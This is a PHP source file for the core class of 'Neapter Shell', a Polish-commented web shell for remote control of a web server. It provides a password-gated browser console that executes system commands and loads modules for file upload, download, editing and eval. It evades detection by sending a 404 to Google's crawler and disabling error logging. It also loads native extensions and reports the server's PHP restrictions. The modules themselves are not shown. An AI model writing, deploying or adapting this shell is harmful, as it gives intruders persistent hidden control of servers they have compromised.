<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/*

Required modules:
- Autoload
- Cat
- Cd
- Chmod
- Cp
- Cr3d1ts
- Download
- Edit
- Eval
- Help
- Id
- Info
- Logout
- Ls
- Mkdir
- Modules
- Mv
- Phpinfo
- Ping
- Pwd
- Remove
- System
- Upload
- Version
*/

require_once dirname(__FILE__) . '/Arr.php';
require_once dirname(__FILE__) . '/Request.php';
require_once dirname(__FILE__) . '/ModuleAbstract.php';
require_once dirname(__FILE__) . '/LoadModules.php';
require_once dirname(__FILE__) . '/XRecursiveDirectoryIterator.php';
require_once dirname(__FILE__) . '/Args.php';
require_once dirname(__FILE__) . '/Utils.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @version 1.0.0-dev
 *
 * @package NeapterShell
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
    /**
     * Wersja
     */
    const VERSION = '1.0.0-dev';

    /**
     * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
     *
     * format: sha1( $sUser . "\xff" . $sPass );
     *
     * @access protected
     * @var    string
     */
    protected $sAuth;

    /**
     * Czas generowania strony
     *
     * @access protected
     * @var    float
     */
    protected $fGeneratedIn;

    /**
     * Nazwa polecenie
     * ':test' => 'test'
     *
     * @access protected
     * @var    string
     */
    protected $sCmd;

    /**
     * Parsowanie argumentow
     *
     * @access protected
     * @var    object
     */
    protected $oArgs;

    /**
     * Zestaw narzędzie
     *
     * @access protected
     * @ver    object
     */
    protected $oUtils;

    /**
     * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
     *
     * @access public
     * @var    boolean
     */
    protected $bDev = FALSE;

    /**
     * Jezeli FALSE to skrypty JavaScript sa wlaczone
     *
     * @access public
     * @var    boolean
     */
    protected $bNoJs = FALSE;

    /**
     * Konstruktor
     *
     * @uses   Request
     *
     * @access public
     * @return void
     */
    public function __construct($sArgs = NULL)
    {
        /**
         * Czas generowania strony a w zasadzie shella
         */
        $this->fGeneratedIn = microtime(1);

        $this->sArgs = $sArgs;

        $this->oUtils = new Utils();
        $this->oArgs = new Args($this->sArgs);

        /**
         * Uwierzytelnianie
         *
         * @see self::$sAuth
         */
        if (defined('NF_AUTH') && preg_match('~^[a-f0-9]{40}\z~', NF_AUTH)) {
            $this->sAuth = NF_AUTH;
        }

        /**
         * @see Request::init
         *
         * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
         *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
         * tylko
         *   ( Request::getGet( 'test' ) === 'test' )
         */
        Request::init();

        /**
         * Blokowanie google bota; baidu, bing, yahoo moga byc
         */
        if ($this->oUtils->isUserAgentOnBlacklist(Request::getServer('HTTP_USER_AGENT'))) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }

        /**
         * Locale
         */
        setLocale(LC_ALL, 'polish.UTF-8');

        /**
         * Naglowek UTF-8
         */
        if (PHP_SAPI !== 'cli') {
            header('Content-type: text/html; charset=utf-8');
        }

        /**
         * Tryb deweloperski
         */
        $this->bDev = isset($_GET['dev']) || isset($_SERVER['dev']);

        /**
         * Wylaczenie JavaScript
         */
        $this->bNoJs = isset($_GET['nojs']);


        /**
         * Config
         */
        $this->loadDevConfig();
        ignore_user_abort(0);

        /**
         * Jesli SafeMode jest wylaczony
         */
        if (!$this->oUtils->isSafeMode()) {
            ini_set('max_execution_time', 0);
            ini_set('memory_limit', '1024M');
            ini_set('default_socket_timeout', 15);
            ini_set('date.timezone', 'Europe/Warsaw');
            ini_set('html_errors', 0);
            ini_set('log_errors', 0);
            ini_set('error_log', NULL);
        } else {
            date_default_timezone_set('Europe/Warsaw');
        }

        /**
         * Uruchomienie shella z domyslna konfiguracja - bez wczytywania ustawien
         * bez rozszerzen i modulow
         */
        if (!isset($_GET['pure'])) {
            $this->loadModulesFromFile();
        }

        if ($sDir = $this->oUtils->cacheGet('chdir')) {
            @ chdir($sDir);
        }
    }

    /**
     * Set display_errors and error_reporting
     */
    protected function loadDevConfig()
    {
        ini_set('display_errors', (int) $this->bDev);
        error_reporting($this->bDev ? -1 : 0);
    }

    /**
     * Load modules from user space
     */
    protected function loadModulesFromFile()
    {
        $sTmp = $this->oUtils->getTmpDir();

        /**
         * Wczytywanie modulow
         */
        if ($sData = $this->oUtils->cacheGet('modules')) {
            ob_start();
            eval('?>' . $sData . '<?');
            ob_clean();
            ob_end_flush();
        }

        /**
         * Wczytywanie rozszerzen
         */
        if ($aAutoload = $this->oUtils->cacheGet('autoload')) {
            /**
             * Wczytywanie rozszerzen
             */
            foreach ($aAutoload as $sExtension) {
                $this->dl($sExtension);
            }
        }
    }

    /**
     * Wczytanie rozszerzenia
     *
     * @access public
     * @param  string $sExtension Nazwa rozszerzenia lub sciezka do pliku
     * @return boolean             TRUE w przypadku pomyslnego zaladowania biblioteki
     */
    public function dl($sExtension)
    {
        /**
         * Nazwa rozszerzenia
         */
        $sName = basename($sExtension);

        if (($iPos = strrpos($sName, '.')) !== FALSE) {
            $sName = substr($sName, 0, $iPos - 1);
        } else {
            $sExtension .= ($this->oUtils->isWindows() ? '.dll' : '.so');
        }

        if (extension_loaded($sName)) {
            return TRUE;
        }

        /**
         * Aby `dl` dzialalo poprawnie wymagane jest wylaczone safe_mode,
         * wlaczenie dyrektywy enable_dl. Funkcja `dl` musi istniec
         * i nie moze znajdowac sie na liscie wylaczonych funkcji
         */
        if (!$this->oUtils->isSafeMode() && function_exists('dl') && ini_get('enable_dl')
            && !in_array('dl', $this->oUtils->getDisabledFunctions())
        ) {
            return dl($sExtension);
        }

        return FALSE;
    }

    protected function auth()
    {
        $sKey = $this->oUtils->getAuthFileKey();

        $sAuth = $this->oUtils->cacheGet($this->oUtils->getAuthFileKey());

        $sPassword = sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), TRUE);

        if ($sAuth !== $sPassword) {
            /**
             * Sprawdzanie poprawnosci sha1( "user\xffpass" );
             */
            if ($this->sAuth !== sha1(Request::getPost('user') . "\xff" . Request::getPost('pass'))) {
                $this->bNoJs = TRUE;

                echo $this->getContent(
                    sprintf('<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
                        Request::getCurrentUrl()
                    ), FALSE
                );
                exit;
            }

            $this->oUtils->cacheSet($sKey, $sPassword);
        }
    }

    /**
     * Pobieranie statusu TAK / NIE
     *
     * @access private
     * @param  boolean $bValue Wartosc
     * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
     * @return string             Status
     */
    private function getStatus($bValue, $bNegative = FALSE)
    {
        return sprintf('<span class="%s">%s</span>', (($bNegative ? !$bValue : $bValue) ? 'green' : 'red'), ($bValue ? 'TAK' : 'NIE'));
    }

    /**
     * Pobieranie menu
     *
     * @access private
     * @return string  Menu w HTMLu
     */
    private function getMenu()
    {
        return sprintf('Wersja PHP: <strong>%s</strong><br/>' .
            'SafeMode: %s<br/>' .
            'OpenBaseDir: <strong>%s</strong><br/>' .
            'Serwer Api: <strong>%s</strong><br/>' .
            'Serwer: <strong>%s</strong><br/>' .
            'TMP: <strong>%s</strong><br/>' .
            'Zablokowane funkcje: <strong>%s</strong><br/>',

            phpversion(),
            $this->getStatus($this->oUtils->isSafeMode(), TRUE),
            ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, TRUE) : $sBasedir),
            php_sapi_name(),
            php_uname(),
            $this->oUtils->getTmpDir(),
            (($sDisableFunctions = implode(',', $this->oUtils->getDisabledFunctions()) === '') ? 'Brak' : $sDisableFunctions)
        );
    }

    /**
     * Domyslna akcja, dostep do konsoli
     *
     * @uses   Request
     * @uses   Form
     *
     * @access public
     * @return string
     */
    public function getActionBrowser($sCmd = NULL)
    {
        $bRaw = ($sCmd !== NULL);

        /**
         * Zawartosc strony
         */
        $sContent = NULL;

        /**
         * Zawartosc konsoli
         */
        $sConsole = NULL;

        /**
         * Domyslna komenda to :ls -l sciezka_do_katalogu
         */
        if ($sCmd === NULL) {
            if (PHP_SAPI === 'cli') {
                /**
                 * Zmienne globalne to zlo ;), to powinno zostac przekazane
                 * jako parametr w konstruktorze ... ale coz ...
                 */
                $aArgv = $GLOBALS['argv'];
                array_shift($aArgv);

                $sCmd = implode($aArgv, ' ');
            } else if (Request::getPost('cmd') === FALSE) {
                $sCmd = ':ls -l ' . dirname(Request::getServer('SCRIPT_FILENAME'));
            } else {
                $sCmd = (string) Request::getPost('cmd');
            }
        }
        /**
         * Komendy shella rozpoczynaja sie od znaku ':'
         */
        if (substr($sCmd, 0, 1) === ':') {
            if (($iPos = strpos($sCmd, ' ') - 1) !== -1) {
                $this->sCmd = substr($sCmd, 1, $iPos);
            } else {
                $this->sCmd = (string) substr($sCmd, 1);
            }

            $this->oArgs = new Args(ltrim(preg_replace(sprintf('~^\:%s[\s+]?~', $this->sCmd), NULL, $sCmd)));

            $aModules = $this->oUtils->getCommands();

            /**
             *  Lista komend i aliasy
             */
            if ($aModules === array()) {
                $sConsole = 'Nie wczytano żadnych modułów !!!';
            } else if (isset($aModules[$this->sCmd])) {
                $sModule = $aModules[$this->sCmd];
                $oModule = new $sModule($this, $this->oUtils, $this->oArgs);

                if (($this->oArgs->getNumberOfParams() === 1) && ($this->oArgs->getParam(0) === 'help')) {
                    $sHelp = $sModule::getHelp();

                    $sConsole = implode(', ', $this->oUtils->getCommandsByModule($sModule)) . ' - ' . $sHelp;
                } else {
                    $sConsole = $oModule->get();
                }
            } else {
                $sConsole = sprintf('Nie ma takiego polecenia "%s"', htmlspecialchars($this->sCmd));
            }
        } elseif ($sCmd === '') {
            $sConsole = 'Wpisz ":help", by zobaczyć pomoc';
        }
        /**
         * Wykonanie komendy systemowej
         */
        else if (class_exists('ModuleSystem')) {
            $this->setArgs($sCmd);
            $oSystem = new ModuleSystem($this, $this->oUtils, $this->oArgs);

            $sConsole = $oSystem->get();
        }

        if ($bRaw || (PHP_SAPI === 'cli')) {
            return htmlspecialchars_decode($sConsole) . "\r\n";
        }

        $sContent = sprintf('<pre id="console">%s</pre><br/>' .
            '<form action="%s" method="post">' .
            '<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="on"/>' .
            '<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
            $sConsole,
            Request::getCurrentUrl(),
            htmlspecialchars(((($sVal = Request::getPost('cmd')) !== FALSE) ? $sVal : (string) $sCmd))
        );

        return $this->getContent($sContent);
    }

    /**
     * Pobieranie calosci strony
     *
     * @uses   Request
     *
     * @access private
     * @param  string $sData Zawartosc strony
     * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
     * @return string
     */
    private function getContent($sData, $bExdendedInfo = TRUE)
    {
        /**
         * isAjax
         */
        if (Request::isAjax()) {
            preg_match('~<pre id="console">(.*)</pre>~s', $sData, $aMatch);

            if ($aMatch === array()) {
                return 'Występił nieznany błąd';
            }

            return $aMatch[1];
        }

        /**
         * Wylaczenie JavaScript
         */
        $sScript = NULL;
        if (!$this->bNoJs) {
            $sScript = '<script src="?js"></script>';
        }

        $sMenu = $this->getMenu();
        $sGeneratedIn = sprintf('%.5f', microtime(1) - $this->fGeneratedIn);
        $sTitle = sprintf('NeapterShell @ %s (%s)', Request::getServer('HTTP_HOST'), Request::getServer('SERVER_ADDR'));
        $sVersion = self::VERSION;
        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><link href=\"?css\" type=\"text/css\" media=\"all\" rel=\"stylesheet\"/></head><body><div id=\"body\">" .
        ($bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL) .
        "<div id=\"content\">{$sData}</div></div>" .
        ($bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL) .
        "</div>{$sScript}</body></html>";
    }

    protected function getHttpCacheHeaders()
    {
        header('Expires: '. date('D, d M Y H:i:s \G\M\T', time() + (3600*24*365)));
    }

    protected function getJs()
    {
        header('Content-type: application/javascript');
        $this->getHttpCacheHeaders();

        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Lib/js.js');
        exit;
    }

    protected function getCss()
    {
        header('Content-type: text/css');
        $this->getHttpCacheHeaders();

        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');;
        exit;
    }

    /**
     * Wyswietlanie strony
     *
     * @access private
     * @return void
     */
    public function get()
    {
        if (isset($_GET['js'])) {
            $this->getJs();
        }

        if (isset($_GET['css'])) {
            $this->getCss();
        }

        /**
         * Uwierzytelnianie
         */
        if ((PHP_SAPI !== 'cli') && ($this->sAuth !== NULL)) {
            $this->auth();
        }

        /**
         * CLI
         */
        if (PHP_SAPI === 'cli') {
            /**
             * Naglowek
             */
            printf("\r\n   .  .          ,          __..     ..\r\n   |\ | _  _.._ -+- _ ._.  (__ |_  _ ||\r\n   | \|(/,(_][_) | (/,[    .__)[ )(/,||\r\n             |          v%s\r\n\r\n\r\n", self::VERSION);

            if (count($GLOBALS['argv']) === 1) {
                for (; ;) {
                    printf('>> ns@127.0.0.1:%s$ ', getcwd());
                    echo $this->getActionBrowser(rtrim(fgets(STDIN)));
                }
                return;
            }
        }

        /**
         * Strasznie duzo jest kodu, wygodniej jest rozdzielic
         * to na inne metody
         */
        echo $this->getActionBrowser();
    }

    /**
     * Set command to execute
     *
     * @param string $sArgs Command to execute
     * @return void
     */
    public function setArgs($sArgs)
    {
        $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', NULL, $sArgs));
    }

    /**
     * Set developer mode ON or OFF
     *
     * @param  boolean $bValue On or off
     * @return void
     */
    protected function setDev($bValue)
    {
        $this->bDev = (bool) $bValue;
        $this->loadDevConfig();
    }

}
